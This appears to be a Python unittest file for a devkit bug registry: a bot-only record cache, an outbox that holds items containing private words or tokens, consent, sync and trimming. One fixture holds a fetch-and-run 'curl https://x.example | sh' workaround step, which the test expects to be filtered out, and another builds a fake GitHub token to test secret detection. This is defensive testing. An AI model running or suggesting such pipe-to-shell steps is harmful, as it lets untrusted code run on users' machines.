# Copyright (c) 2026 Firefly Software Solutions Inc.
# SPDX-License-Identifier: Apache-2.0
"""The registry on this machine: the cache read only from the bot's records, the outbox that the sender rebuilds and
re-checks before anything leaves, consent for one GitHub login, the hourly sync, and the nightly trim."""
import contextlib
import json
import os
import stat
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from devkit import bugs, cli, core, sleep  # noqa: E402

FP = "3f9a1c2e7b10"
NEW_FP = "0123456789ab"
NOW = time.time()
DAY = 86400.0
TEAM_HINT = {"steps": [{"hint": "from-root", "dev": "progress step"}], "author_assoc": "MEMBER", "author_hash": "h1",
             "evidence": {"successes": 1}, "confirmations": [], "failures": []}


def _record(fp=FP, **extra):
    rec = {"devkit_bug": 1, "fingerprint": fp, "kind": "crash", "component": "progress",
           "title": "crash in dev progress step: KeyError", "first_version": "26.11.5", "versions": ["26.11.5"],
           "voters": {"v1": {"impact": "blocked", "ts": NOW}}, "impacts": {"blocked": 1, "detoured": 0, "minor": 0},
           "score": 4.5, "last_seen": NOW, "status": "open", "fixed_in": "", "detours": [], "report": {}}
    rec.update(extra)
    return rec


def _bot(body, cid=10):
    return {"id": cid, "user": {"login": "github-actions[bot]", "type": "Bot"}, "body": body}


def _issue(number, opener="someone", **extra):
    issue = {"number": number, "state": "open", "closed_at": None, "updated_at": "2026-11-08T10:00:00Z",
             "labels": [{"name": "devkit-bug"}], "user": {"login": opener}}
    issue.update(extra)
    return issue


class FakeClient:
    """GitHub as the sender and the cache see it, in memory."""

    def __init__(self, issues=(), comments=None, login="ana", fail=False, private_fails=False):
        self._issues, self._comments, self._login = list(issues), dict(comments or {}), login
        self.fail, self.private_fails = fail, private_fails
        self.created, self.posted, self.private = [], [], []

    def _net(self):
        if self.fail:
            raise OSError("network is unreachable")

    def issues(self, label, since):
        self._net()
        return list(self._issues)

    def comments(self, number):
        self._net()
        return list(self._comments.get(number, []))

    def create_issue(self, title, body):
        self._net()
        self.created.append((title, body))
        return 100 + len(self.created)

    def comment(self, number, body):
        self._net()
        self.posted.append((number, body))

    def login(self):
        return self._login

    def private_report(self, title, body):
        self._net()
        if self.private_fails:
            raise RuntimeError("private vulnerability reporting is not enabled")
        self.private.append((title, body))


def _payload(kind, fp=FP, **fields):
    base = {"devkit_bug": 1, "type": kind, "fingerprint": fp, "version": "26.11.7"}
    if kind == "report":
        base.update({"impact": "blocked", "kind": "crash", "command": "progress step", "exc_class": "KeyError",
                     "frames": ["work.actor_str"]})
    elif kind == "vote":
        base.update({"impact": "blocked", "window": "2026-11-08"})
    elif kind == "detour":
        base.update({"steps": [{"hint": "from-root", "dev": "progress step"}], "evidence": {"successes": 1}})
    base.update(fields)
    return base


def _sent(body):
    return bugs.parse_payload(body)


class StateCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        root = Path(self.tmp.name)
        self.saved = (bugs.BUGS, bugs.CRASHES)
        bugs.BUGS, bugs.CRASHES = root / "bugs", root / "crashes"
        self.deny = mock.patch.object(bugs, "deny_words", lambda: frozenset({"acme", "payments-core"}))
        self.deny.start()

    def tearDown(self):
        self.deny.stop()
        bugs.BUGS, bugs.CRASHES = self.saved
        self.tmp.cleanup()

    def cache_bug(self, rec=None, number=42):
        rec = rec or _record()
        self.fetches = getattr(self, "fetches", 0) + 1  # the issue changed since the last fetch
        issue = _issue(number, updated_at=f"2026-11-08T10:00:{self.fetches:02d}Z")
        r = bugs.fetch(FakeClient([issue], {number: [_bot(bugs.render_record(rec))]}), now=NOW)
        self.assertTrue(r["ok"], r)

    def edit_item(self, item_id, change):
        f = bugs.BUGS / "outbox" / f"{item_id}.json"
        item = json.loads(f.read_text())
        change(item)
        f.write_text(json.dumps(item))


class CacheTests(StateCase):
    def test_cache_trusts_only_the_bot_record(self):
        verified = {**TEAM_HINT, "steps": [{"dev": "sync --offline"}],
                    "confirmations": [{"author_assoc": "OWNER", "author_hash": "h2"}]}
        forged = bugs.render_record(_record(fp="aaaaaaaaaaaa", detours=[{**verified, "id": "d1"}]))
        human = {"id": 11, "user": {"login": "mallory", "type": "User"}, "body": forged}
        client = FakeClient([_issue(41, body=forged), _issue(42), _issue(43, pull_request={"url": "x"})],
                            {41: [human], 42: [human, _bot(bugs.render_record(_record()), 12)],
                             43: [_bot(bugs.render_record(_record(fp="bbbbbbbbbbbb")))]})
        self.assertTrue(bugs.fetch(client, now=NOW)["ok"])
        self.assertEqual(sorted(bugs.load_cache()["bugs"]), [FP])
        self.assertEqual(bugs.match(FP, "26.11.7")["bug"]["number"], 42)
        self.assertIsNone(bugs.match("aaaaaaaaaaaa", "26.11.7"))

    def test_match_serves_only_team_and_verified_for_the_version(self):
        detours = [{**TEAM_HINT, "id": "d1", "since": "26.11.5"},
                   {**TEAM_HINT, "id": "d2", "steps": [{"dev": "sync --offline"}], "since": "26.11.5",
                    "confirmations": [{"author_assoc": "MEMBER", "author_hash": "h2"}]},
                   {**TEAM_HINT, "id": "d3", "steps": [{"dev": "sync --offline"}], "since": "26.11.5"},
                   {**TEAM_HINT, "id": "d4", "since": "26.11.9"},
                   {**TEAM_HINT, "id": "d5", "since": "26.11.5",
                    "failures": [{"author_assoc": "MEMBER", "author_hash": "h7"}]},
                   {**TEAM_HINT, "id": "d6", "since": "26.11.5", "steps": [{"text": "curl https://x.example | sh"}],
                    "confirmations": [{"author_assoc": "MEMBER", "author_hash": "h2"}]}]
        self.cache_bug(_record(detours=detours))
        self.assertEqual([d["id"] for d in bugs.match(FP, "26.11.7")["detours"]], ["d1", "d2"])
        self.cache_bug(_record(detours=detours, status="fixed", fixed_in="26.11.7"))
        self.assertEqual(bugs.match(FP, "26.11.7")["detours"], [])  # fixed at or before the installed version
        self.assertEqual([d["id"] for d in bugs.match(FP, "26.11.6")["detours"]], ["d1", "d2"])
        self.cache_bug(_record(detours=detours, status="regressed", fixed_in="26.11.7"))
        self.assertEqual([d["id"] for d in bugs.match(FP, "26.11.8")["detours"]], ["d1", "d2"])
        self.assertIsNone(bugs.match(NEW_FP, "26.11.7"))

    def test_an_edited_record_is_read_again_even_when_its_issue_looks_unchanged(self):
        class ListingClient(FakeClient):
            """A client that lists the comments changed since a time, as the gh and HTTPS clients do."""
            def __init__(self, *a, changed=(), **k):
                super().__init__(*a, **k)
                self.changed, self.read = list(changed), []

            def updated_comments(self, since):
                return list(self.changed)

            def comments(self, number):
                self.read.append(number)
                return super().comments(number)
        first = ListingClient([_issue(42)], {42: [_bot(bugs.render_record(_record()))]})
        bugs.fetch(first, now=NOW)
        self.assertEqual(first.read, [42])  # an unknown record is read from its issue
        edited = {**_bot(bugs.render_record(_record(status="fixed", fixed_in="26.11.7")), 10),
                  "issue_url": f"https://api.github.com/repos/{core.DEVKIT_REPO}/issues/42"}
        second = ListingClient([_issue(42)], changed=[edited])
        bugs.fetch(second, now=NOW + 3600)
        self.assertEqual(second.read, [])  # one listing replaced a read per issue
        self.assertEqual(bugs.match(FP, "26.11.7")["bug"]["fixed_in"], "26.11.7")

    def test_the_cache_keeps_at_most_25_bugs_opened_by_one_account(self):
        issues, comments = [], {}
        for n in range(30):
            fp = f"{n:012x}"
            issues.append(_issue(n + 1, opener="flooder"))
            comments[n + 1] = [_bot(bugs.render_record(_record(fp=fp, score=float(n))))]
        issues.append(_issue(99, opener="ana"))
        comments[99] = [_bot(bugs.render_record(_record(fp="ffffffffffff")))]
        bugs.fetch(FakeClient(issues, comments), now=NOW)
        cached = bugs.load_cache()["bugs"]
        self.assertEqual(sum(1 for e in cached.values() if e["opener"] == "flooder"), 25)
        self.assertIn("ffffffffffff", cached)


class OutboxTests(StateCase):
    def setUp(self):
        super().setUp()
        bugs.set_consent("on", "ana")

    def test_flush_rechecks_items(self):
        self.cache_bug()
        edited = bugs.queue({"payload": _payload("detour")})
        self.edit_item(edited, lambda it: it["payload"].update(cwd="/Users/ana/acme"))
        changed = bugs.queue({"payload": _payload("detour", steps=[{"text": "Run the step twice."}])})
        good = bugs.queue({"payload": _payload("detour", steps=[{"text": "Wait a minute, then run it again."}])})
        self.assertEqual(sorted(i["id"] for i in bugs.pending()), sorted([changed, good]))  # free text is held
        bugs.approve(changed)
        bugs.approve(good)
        self.assertEqual({i["id"]: i["approved"] for i in bugs.pending()}, {changed: True, good: True})
        self.edit_item(changed, lambda it: it["payload"]["steps"][0].update(text="Run it three times."))
        self.assertEqual({i["id"]: i["approved"] for i in bugs.pending()}, {changed: False, good: True})
        client = FakeClient()
        counts = bugs.flush(client, now=NOW + 60)
        self.assertEqual({k: counts[k] for k in ("sent", "held", "skipped")}, {"sent": 1, "held": 1, "skipped": 1})
        self.assertEqual([(n, _sent(b)["steps"]) for n, b in client.posted],
                         [(42, [{"text": "Wait a minute, then run it again."}])])

    def test_a_private_word_or_a_secret_in_any_field_holds_the_item(self):
        # not only free text: a valid exception class made from a project's name, a project named like a devkit
        # command, a token where a class name goes; each waits in `dev bug pending`, its problem naming the field
        token = "ghp_" + "A1b2C3d4E5f6" * 3
        made = (("aaaaaaaaaaaa", {"command": "", "exc_class": "PaymentsCoreError"}, "exc_class"),
                ("bbbbbbbbbbbb", {"command": "progress step"}, "command"),
                ("cccccccccccc", {"command": "", "exc_class": token}, "exc_class"))
        items = {bugs.queue({"payload": _payload("report", fp=fp, **fields)}): field for fp, fields, field in made}
        client = FakeClient()
        with mock.patch.object(bugs, "deny_words", lambda: frozenset({"acme", "payments-core", "progress"})):
            counts = bugs.flush(client, now=NOW + 60)
        self.assertEqual((client.created, client.posted, counts["sent"]), ([], [], 0))
        pending = {i["id"]: i.get("problem") or "" for i in bugs.pending()}
        self.assertEqual(set(pending), set(items))
        for item_id, field in items.items():
            self.assertIn(field, pending[item_id])
            self.assertNotIn("A1b2C3d4", pending[item_id])

    def test_the_sender_reads_the_need_for_review_from_the_item_not_its_held_flag(self):
        # an outbox file rewritten with held false: its free text still waits for the developer's approval
        payload = {**_payload("report", fp=NEW_FP, title="dev status breaks in the billing monorepo"), "kind": "command"}
        item = bugs.queue({"payload": payload})
        self.edit_item(item, lambda it: it.update(held=False))
        client = FakeClient()
        counts = bugs.flush(client, now=NOW + 60)
        self.assertEqual((client.created, client.posted, counts["held"]), ([], [], 1))
        self.assertEqual([i["id"] for i in bugs.pending()], [item])
        bugs.approve(item)
        self.assertEqual(bugs.flush(client, now=NOW + 120)["sent"], 1)  # the developer's approval sends it

    def test_flush_refuses_another_login(self):
        self.cache_bug()
        bugs.queue({"payload": _payload("detour")})
        client = FakeClient(login="bob")
        counts = bugs.flush(client, now=NOW + 60)
        self.assertEqual((client.posted, client.created), ([], []))
        self.assertIn("ana", counts["error"])
        self.assertEqual(len(list((bugs.BUGS / "outbox").glob("*.json"))), 1)

    def test_nothing_is_sent_without_consent(self):
        bugs.set_consent("off", "ana")
        bugs.queue({"payload": _payload("report", fp=NEW_FP)})
        client = FakeClient()
        self.assertEqual(bugs.flush(client, now=NOW + 60)["held"], 1)
        self.assertEqual(client.created, [])

    def test_security_items_never_reach_issues(self):
        item = bugs.queue({"payload": _payload("report", fp=NEW_FP, frames=["guard.check_git"])})
        self.assertTrue(bugs.pending()[0]["security"])
        bugs.approve(item)
        failing = FakeClient(private_fails=True)
        self.assertEqual(bugs.flush(failing, now=NOW + 60)["held"], 1)
        self.assertEqual((failing.created, failing.posted), ([], []))
        self.assertEqual([i["id"] for i in bugs.pending()], [item])  # still waiting for the developer
        ok = FakeClient()
        self.assertEqual(bugs.flush(ok, now=NOW + 60)["sent"], 1)
        self.assertEqual((len(ok.private), ok.created, ok.posted), (1, [], []))
        self.assertEqual(bugs.pending(), [])

    def test_offline_keeps_cache_and_outbox(self):
        self.cache_bug()
        before = (bugs.BUGS / "cache.json").read_bytes()
        bugs.queue({"payload": _payload("vote")})
        later = NOW + 2 * 3600  # past the random delay of up to an hour
        result = bugs.sync(FakeClient(fail=True), now=later)
        self.assertFalse(result["fetch"]["ok"])
        self.assertIn("unreachable", result["fetch"]["error"])
        self.assertEqual((bugs.BUGS / "cache.json").read_bytes(), before)
        self.assertEqual(result["flush"]["failed"], 1)
        item = json.loads(next((bugs.BUGS / "outbox").glob("*.json")).read_text())
        self.assertEqual(item["attempts"], 1)
        self.assertGreater(item["next_try"], later)
        client = FakeClient()
        self.assertEqual(bugs.flush(client, now=item["next_try"] + 1)["sent"], 1)  # the next good sync sends it
        self.assertEqual([n for n, _ in client.posted], [42])

    def test_votes_go_out_once_per_issue_per_day(self):
        self.cache_bug()
        for impact in ("minor", "blocked", "detoured"):
            bugs.queue({"payload": _payload("vote", impact=impact)})
        client = FakeClient()
        day = (int((NOW + 2 * 3600) // DAY) + 1) * DAY + 12 * 3600  # noon UTC, past the random delay
        self.assertEqual(bugs.flush(client, now=day)["sent"], 1)
        self.assertEqual([(n, _sent(b)["impact"]) for n, b in client.posted], [(42, "blocked")])
        bugs.queue({"payload": _payload("vote", impact="detoured")})
        bugs.flush(client, now=day + 60)
        self.assertEqual(len(client.posted), 1)  # this machine already voted on #42 today
        bugs.queue({"payload": _payload("vote", impact="detoured")})
        bugs.flush(client, now=day + DAY)
        self.assertEqual(len(client.posted), 2)

    def test_a_new_bug_is_filed_once(self):
        client = FakeClient()
        bugs.queue({"payload": _payload("report", fp=NEW_FP)})
        self.assertEqual(bugs.flush(client, now=NOW + 60)["sent"], 1)
        self.assertEqual(len(client.created), 1)
        title, body = client.created[0]
        self.assertEqual(_sent(body)["fingerprint"], NEW_FP)
        self.assertIn("crash in dev progress step: KeyError", title)
        bugs.queue({"payload": _payload("report", fp=NEW_FP, impact="detoured")})
        bugs.flush(client, now=NOW + 120)
        self.assertEqual(len(client.created), 1)  # the second report goes to the issue this machine filed
        self.assertEqual([n for n, _ in client.posted], [101])

    def test_a_new_report_goes_only_to_an_issue_the_registry_labeled(self):
        class Searching(FakeClient):
            def __init__(self, hits):
                super().__init__()
                self.hits = hits

            def find(self, fp):
                return self.hits
        label = [{"name": "devkit-bug"}]
        quoting = Searching([3, {"number": 4, "labels": []}, {"number": 5, "labels": label, "pull_request": {}},
                             {"number": 6, "labels": [["devkit-bug"]]}])  # issues that only quote the fingerprint
        bugs.queue({"payload": _payload("report", fp=NEW_FP)})
        self.assertEqual(bugs.flush(quoting, now=NOW + 60)["sent"], 1)
        self.assertEqual((len(quoting.created), quoting.posted), (1, []))
        registry = Searching([{"number": 4, "labels": []}, {"number": 9, "labels": label}])
        bugs.queue({"payload": _payload("report", fp="0a0b0c0d0e0f")})
        bugs.flush(registry, now=NOW + 120)
        self.assertEqual(([n for n, _ in registry.posted], registry.created), ([9], []))

    def test_the_gh_search_asks_only_for_registry_issues(self):
        asked = []

        def gh(args, timeout=60):
            asked.append(args)
            return 0, json.dumps({"items": [{"number": 4, "labels": []},
                                            {"number": 9, "labels": [{"name": "devkit-bug"}]}]}), ""
        with mock.patch("devkit.gitx.GH", gh):
            found = bugs.GhClient("owner/registry").find(NEW_FP)
        self.assertEqual([i["number"] for i in found], [9])
        self.assertIn(f"q=repo:owner/registry is:issue label:devkit-bug in:body {NEW_FP}", asked[0])

    def test_an_old_item_that_never_went_out_is_given_up_after_7_days(self):
        bugs.queue({"payload": _payload("detour")})  # no issue is known for it, so it cannot go anywhere
        self.assertEqual(bugs.flush(FakeClient(), now=NOW + 60)["skipped"], 1)
        self.assertEqual(bugs.flush(FakeClient(), now=NOW + 8 * DAY)["failed"], 1)
        self.assertEqual(list((bugs.BUGS / "outbox").glob("*.json")), [])

    def test_drop_removes_a_held_item(self):
        item = bugs.queue({"payload": _payload("report", fp=NEW_FP, title="It fails on the second run")})
        self.assertEqual([i["id"] for i in bugs.pending()], [item])
        bugs.drop(item)
        self.assertEqual(bugs.pending(), [])
        with self.assertRaises(KeyError):
            bugs.approve(item)


class ConsentTests(StateCase):
    def test_consent_is_private_and_the_config_can_switch_it_off(self):
        bugs.set_consent("reports", "ana")
        c = bugs.consent()
        self.assertEqual((c["login"], c["share"]), ("ana", "reports"))
        self.assertEqual(stat.S_IMODE(os.stat(bugs.BUGS / "consent.json").st_mode), 0o600)
        with mock.patch.dict(core.CFG, {"bugs": {"share": "off", "sync": True}}):
            self.assertEqual(bugs.consent()["share"], "off")
        with self.assertRaises(ValueError):
            bugs.set_consent("maybe", "ana")

    def test_reports_only_consent_sends_no_votes(self):
        bugs.set_consent("reports", "ana")
        self.cache_bug()
        bugs.queue({"payload": _payload("vote")})
        bugs.queue({"payload": _payload("detour")})
        client = FakeClient()
        bugs.flush(client, now=NOW + 2 * 3600)
        self.assertEqual([_sent(b)["type"] for _, b in client.posted], ["detour"])


class TrimTests(StateCase):
    def test_trim_keeps_recent_state(self):
        occ = bugs.BUGS / "occurrences.jsonl"
        occ.parent.mkdir(parents=True)
        occ.write_text(json.dumps({"ts": NOW - 91 * DAY, "code": "old"}) + "\n" +
                       json.dumps({"ts": NOW - DAY, "code": "new"}) + "\n")
        ledger = bugs.BUGS / "ledger"
        ledger.mkdir()
        bugs.CRASHES.mkdir()
        for folder, name, age in ((ledger, "s-old.jsonl", 8), (ledger, "s-new.jsonl", 1),
                                  (bugs.CRASHES, "old.txt", 31), (bugs.CRASHES, "new.txt", 1)):
            (folder / name).write_text("x")
            os.utime(folder / name, (NOW - age * DAY, NOW - age * DAY))
        self.assertEqual(bugs.trim(now=NOW), {"occurrences": 1, "ledgers": 1, "crashes": 1})
        self.assertEqual([json.loads(x)["code"] for x in occ.read_text().splitlines()], ["new"])
        self.assertEqual(sorted(p.name for p in ledger.iterdir()), ["s-new.jsonl"])
        self.assertEqual(sorted(p.name for p in bugs.CRASHES.iterdir()), ["new.txt"])


class ConcurrencyTests(StateCase):
    def test_concurrent_queue_and_occurrences(self):
        ids, errors = [], []

        def work(tag):
            try:
                for i in range(200):
                    ids.append(bugs.queue({"payload": _payload("vote", impact="minor")}))
                    bugs.record_occurrence("hook", FP, session=f"{tag}-{i}", event="post-tool")
            except Exception as e:  # a failure in a thread must fail the test, not vanish with the thread
                errors.append(e)
        threads = [threading.Thread(target=work, args=(t,)) for t in ("a", "b")]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        self.assertEqual(errors, [])
        self.assertEqual(len(set(ids)), 400)
        items = [json.loads(f.read_text()) for f in (bugs.BUGS / "outbox").glob("*.json")]
        self.assertEqual(sorted(i["id"] for i in items), sorted(ids))
        lines = (bugs.BUGS / "occurrences.jsonl").read_text().splitlines()
        self.assertEqual(sorted(json.loads(x)["session"] for x in lines),
                         sorted(f"{t}-{i}" for t in "ab" for i in range(200)))


class WiringTests(StateCase):
    def run_sync(self, *flags, cfg=None, extra=()):
        calls = []
        stubs = [*extra, mock.patch.object(bugs, "sync", lambda: calls.append(True) or {}),
                 mock.patch("devkit.registry.build", lambda **k: {"projects": [], "sessions": []}),
                 mock.patch("devkit.registry.write_outputs", lambda reg: []),
                 mock.patch("devkit.dashboard.write", lambda reg: None),
                 mock.patch("devkit.work.pull", lambda: None), mock.patch("devkit.work.expire_locks", lambda: []),
                 mock.patch("devkit.work.write_presence", lambda s: None),
                 mock.patch("devkit.providers.status", lambda **k: {}), mock.patch("devkit.policy.diff", lambda: []),
                 mock.patch("devkit.approvals.sweep", lambda: None), mock.patch("devkit.continuity.expire",
                                                                               lambda now=None: 0),
                 mock.patch("devkit.sleep.due", lambda: False), mock.patch("devkit.canary.prune", lambda: None),
                 mock.patch.object(cli, "commit_push", lambda **k: None),
                 mock.patch.object(cli, "_expire_sessions", lambda: None),
                 mock.patch.object(cli, "_rotate_log", lambda f: None)]
        with tempfile.TemporaryDirectory() as d, contextlib.ExitStack() as stack:
            for s in stubs:
                stack.enter_context(s)
            stack.enter_context(mock.patch.object(cli, "STATE", Path(d)))
            stack.enter_context(mock.patch.dict(core.CFG, {"gc": {"auto": False}, **(cfg or {})}))
            a = cli.build_parser().parse_args(["sync", "--scheduled", "--quiet", "--no-push", *flags])
            a.fn(a)
        return calls

    def test_the_hourly_sync_sweeps_other_sessions_store(self):
        # Without the sweep nothing expires in the peers store: told messages, ended sessions' boxes, void claims and
        # old escalations pile up, and every Stop gate, welcome and dev status reads them all
        swept = []
        self.run_sync(extra=[mock.patch("devkit.peers.sweep", lambda now=None: swept.append(True) or {})])
        self.assertEqual(swept, [True])

    def test_the_hourly_sync_refreshes_the_registry_unless_offline_or_switched_off(self):
        self.assertEqual(self.run_sync(), [True])
        self.assertEqual(self.run_sync("--offline"), [])
        self.assertEqual(self.run_sync(cfg={"bugs": {"share": None, "sync": False}}), [])

    def test_sleep_trims_the_registry_state(self):
        bugs.CRASHES.mkdir(parents=True)
        old = bugs.CRASHES / "old.txt"
        old.write_text("x")
        os.utime(old, (time.time() - 40 * DAY, time.time() - 40 * DAY))
        with mock.patch("devkit.lessons.publish_usage", lambda: None), \
                mock.patch("devkit.lessons.consolidate", lambda **k: []), \
                mock.patch.object(sleep, "hygiene_plan", lambda now=None: []), \
                mock.patch.object(sleep, "LAST", Path(self.tmp.name) / "sleep.json"):
            result = sleep.run(quiet=True)
        self.assertFalse(old.exists())
        self.assertEqual(result["bugs"]["crashes"], 1)


if __name__ == "__main__":
    unittest.main()
